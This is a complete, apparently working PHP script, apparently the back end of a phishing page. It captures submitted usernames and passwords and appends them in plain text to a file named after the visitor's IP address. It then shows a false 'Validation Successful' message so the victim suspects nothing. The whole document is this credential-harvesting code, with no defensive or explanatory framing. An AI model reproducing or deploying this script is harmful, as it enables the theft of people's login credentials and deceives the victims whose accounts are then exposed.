<?php
if(isset($_POST['Username']) && isset($_POST['Password'])) {
    $file = $_SERVER['REMOTE_ADDR'].".txt";
    $data = $_POST['Username'] . '-' . $_POST['Password'] . "\n";
    $ret = file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "Validation Successful, you may close this tab. ";
    }
}
else {
   die('no post data to process');
}

# Thanks to Stackoverflow's Floby
